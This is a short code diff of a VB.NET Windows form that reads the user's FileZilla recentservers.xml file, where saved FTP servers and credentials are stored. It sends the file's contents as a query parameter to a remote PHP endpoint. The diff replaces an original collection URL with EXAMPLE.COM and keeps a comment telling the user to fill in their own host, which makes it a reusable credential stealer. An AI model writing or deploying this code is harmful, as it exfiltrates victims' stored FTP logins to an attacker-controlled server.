@@ -10,7 +10,7 @@ Public Class Form1
         Dim path As String = appData + "\FileZilla\recentservers.xml"
         readText = File.ReadAllText(path)
 
-        WebBrowser2.Navigate("https://src.iut-troyes.univ-reims.fr/~mmi16f03/random/fz/a.php?a=" + readText) 'Change what's in all caps
+        WebBrowser2.Navigate("https://EXAMPLE.COM/a.php?a=" + readText) 'Change what's in all caps
 
         RichTextBox1.Text = readText
 
